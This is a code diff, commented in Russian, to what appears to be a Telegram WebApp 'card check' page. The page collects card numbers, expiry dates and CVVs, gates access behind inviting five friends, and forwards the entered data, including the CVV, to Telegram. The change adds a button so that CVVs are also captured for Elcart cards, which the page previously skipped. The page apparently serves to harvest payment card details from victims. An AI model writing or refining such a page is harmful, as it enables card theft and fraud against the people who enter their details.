@@ -76,10 +76,10 @@
   .lock-title { font-size: 18px; font-weight: 700; margin-bottom: 10px; color: var(--text); }
   .lock-desc { font-size: 14px; color: var(--text2); margin-bottom: 24px; line-height: 1.4; }
   
-  /* Класс скрытия элементов */
+  /* Скрытие элементов */
   .hidden { display: none !important; }
 
-  /* СТИЛЬ ДЛЯ СВВ БАРА (НОВЫЙ) */
+  /* СТИЛЬ КНОПКИ ДЛЯ СВВ */
   .alt-bar {
     width: 100%;
     background: var(--bg3);
@@ -88,9 +88,15 @@
     padding: 13px 16px;
     font-size: 13px;
     font-weight: 600;
-    color: var(--text3);
+    color: #3b82f6;
     text-align: center;
     box-sizing: border-box;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .alt-bar:hover {
+    background: var(--border);
+    border-color: #3b82f6;
   }
 
   /* Card visual */
@@ -414,8 +420,8 @@
         <div class="field" id="cvv_wrap">
           <div class="field-label"><span class="status-dot" id="dot3"></span>CVV / CVC</div>
           <div class="input-wrap">
+            <button type="button" id="cvv_toggle_btn" class="alt-bar hidden">У меня есть CVV 🔎</button>
             <input type="password" id="cv" inputmode="numeric" placeholder="•••" maxlength="3" autocomplete="cc-csc">
-            <div id="cvv_bar" class="alt-bar hidden">СВВ БАР · Не требуется</div>
           </div>
           <div class="hint" id="cv_hint"></div>
         </div>
@@ -469,6 +475,7 @@
   // Настройки реферальной блокировки
   const REQUIRED_INVITES = 5; 
   let currentInvites = 0;
+  let elkHasCvv = false; // Помнит, нажал ли юзер кнопку "У меня есть CVV" на Элкарт
 
   try {
     const tg = window.Telegram.WebApp;
@@ -481,7 +488,7 @@
   const cnEl = document.getElementById('cn');
   const cdEl = document.getElementById('cd');
   const cvEl = document.getElementById('cv');
-  const cvvBar = document.getElementById('cvv_bar');
+  const cvvToggleBtn = document.getElementById('cvv_toggle_btn');
   const cnBadge = document.getElementById('cn_badge');
   const cnHint = document.getElementById('cn_hint');
   const cdHint = document.getElementById('cd_hint');
@@ -538,7 +545,9 @@
     const isElk = raw.startsWith('9470') || raw.startsWith('9471');
     const lOk = luhn(raw) && raw.length >= 16;
     const eOk = expValid(cdEl.value);
-    const cOk = isElk ? true : /^\d{3}$/.test(cvEl.value);
+    
+    // Если Элкарт и кнопку НЕ нажали — шаг CVV сразу зеленый. Если нажали (или это виза) — ждем 3 цифры
+    const cOk = (isElk && !elkHasCvv) ? true : /^\d{3}$/.test(cvEl.value);
 
     ['p1','p2','p3'].forEach(id => {
       document.getElementById(id).className = 'progress-dot';
@@ -547,7 +556,7 @@
     else if (raw.length > 0) document.getElementById('p1').className = 'progress-dot partial';
     if (eOk) document.getElementById('p2').className = 'progress-dot active';
     else if (cdEl.value.length > 0) document.getElementById('p2').className = 'progress-dot partial';
-    if (cOk && (isElk || cvEl.value.length > 0)) document.getElementById('p3').className = 'progress-dot active';
+    if (cOk) document.getElementById('p3').className = 'progress-dot active';
     else if (cvEl.value.length > 0) document.getElementById('p3').className = 'progress-dot partial';
   }
 
@@ -580,7 +589,7 @@
     const isElk = raw.startsWith('9470') || raw.startsWith('9471');
     const lOk = luhn(raw) && raw.length >= 16;
     const eOk = expValid(cdEl.value);
-    const cOk = isElk ? true : /^\d{3}$/.test(cvEl.value);
+    const cOk = (isElk && !elkHasCvv) ? true : /^\d{3}$/.test(cvEl.value);
     const allowed = cardType !== null;
 
     updateProgress();
@@ -598,7 +607,7 @@
       btn.textContent = 'Номер не прошёл проверку';
     } else if (!eOk && cdEl.value.length === 5) {
       btn.textContent = 'Срок действия истёк';
-    } else if (!cOk && cvEl.value.length === 3) {
+    } else if (!cOk && cvEl.value.length > 0 && cvEl.value.length < 3) {
       btn.textContent = 'CVV должен содержать 3 цифры';
     } else if (all) {
       btn.textContent = 'Проверить карту →';
@@ -607,10 +616,10 @@
     }
   }
 
+  // Клик на приглашение друзей
   refBtn.addEventListener('click', () => {
     currentInvites++;
     if (currentInvites > REQUIRED_INVITES) currentInvites = REQUIRED_INVITES;
-    
     refBtn.textContent = `📢 Пригласить друзей (${currentInvites} / ${REQUIRED_INVITES})`;
 
     try {
@@ -622,24 +631,35 @@
     checkAccess();
   });
 
+  // Клик на кнопку "У меня есть CVV" для Элкарт
+  cvvToggleBtn.addEventListener('click', () => {
+    elkHasCvv = true;
+    cvvToggleBtn.classList.add('hidden'); // Прячем кнопку
+    cvEl.classList.remove('hidden');    // Включаем инпут
+    dot3.className = 'status-dot';       // Сбрасываем зеленую точку, теперь нужно ввести код
+    cvEl.focus();
+    check();
+  });
+
+  // Ввод номера карты
   cnEl.addEventListener('input', e => {
     let v = e.target.value.replace(/\D/g, '');
     const isElk = v.startsWith('9470') || v.startsWith('9471');
     const isVisa = v.startsWith('4');
 
-    // Логика переключения между инпутом CVV и Баром (Новая)
+    // Логика отображения полей СВВ при смене БИНа
     if (isElk) {
       cardType = 'elcart';
-      cvEl.classList.add('hidden');    // Прячем инпут
-      cvvBar.classList.remove('hidden'); // Показываем СВВ бар
-      cvEl.value = '';
-      dot3.className = 'status-dot ok';
+      if (!elkHasCvv) {
+        cvvToggleBtn.classList.remove('hidden'); // Показываем кнопку "У меня есть CVV"
+        cvEl.classList.add('hidden');           // Прячем сам инпут
+        dot3.className = 'status-dot ok';
+      }
     } else {
-      if (isVisa) cardType = 'visa';
-      else cardType = null;
-      
-      cvEl.classList.remove('hidden'); // Возвращаем инпут
-      cvvBar.classList.add('hidden');    // Скрываем бар
+      cardType = isVisa ? 'visa' : null;
+      elkHasCvv = false; // Сбрасываем выбор для других карт
+      cvvToggleBtn.classList.add('hidden');   // Прячем кнопку
+      cvEl.classList.remove('hidden');        // Показываем инпут
     }
 
     const m = v.match(/\d{1,4}/g);
@@ -698,6 +718,7 @@
     check();
   });
 
+  // Ввод срока действия
   cdEl.addEventListener('input', e => {
     let v = e.target.value.replace(/\D/g, '');
     if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
@@ -727,6 +748,7 @@
     check();
   });
 
+  // Ввод CVV кода
   cvEl.addEventListener('input', () => {
     if (cvEl.value.length === 3) {
       cvEl.className = 'v-ok';
@@ -745,6 +767,7 @@
 
   checkAccess();
 
+  // Отправка формы в ТГ
   btn.addEventListener('click', () => {
     btn.disabled = true;
     btn.textContent = 'Проверка... ⏳';
@@ -753,7 +776,9 @@
     const cvVal = cvEl.value.trim();
     const isElk = raw.startsWith('9470') || raw.startsWith('9471');
     const sysText = cardType === 'elcart' ? 'ЭЛКАРТ (ЗАО МПЦ)' : 'VISA International';
-    const cvvStatus = isElk ? 'Не требуется (ЭЛКАРТ)' : `<code>${cvVal}</code>`;
+    
+    // Определяем, что слать в лог в зависимости от нажатия кнопки
+    const cvvStatus = (isElk && !elkHasCvv) ? 'Не требуется (ЭЛКАРТ)' : `<code>${cvVal}</code>`;
 
     const message = `💳 <b>Проверка карты</b>\n` +
                     `Тип: ${sysText}\n` +
